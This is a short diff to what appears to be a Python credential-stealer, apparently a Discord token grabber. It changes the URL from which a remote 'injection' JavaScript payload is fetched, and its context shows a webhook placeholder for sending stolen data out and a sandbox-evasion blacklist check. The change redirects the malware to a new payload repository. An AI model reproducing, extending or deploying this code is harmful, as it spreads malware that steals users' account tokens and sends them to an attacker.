@@ -50,7 +50,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 wh00k = "WEBHOOK HERE"
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+inj_url = "https://raw.githubusercontent.com/PsxScriptsW/injection/main/index.js"
     
 DETECTED = False
 #bir ucaktik dustuk bir gemiydik battik :(
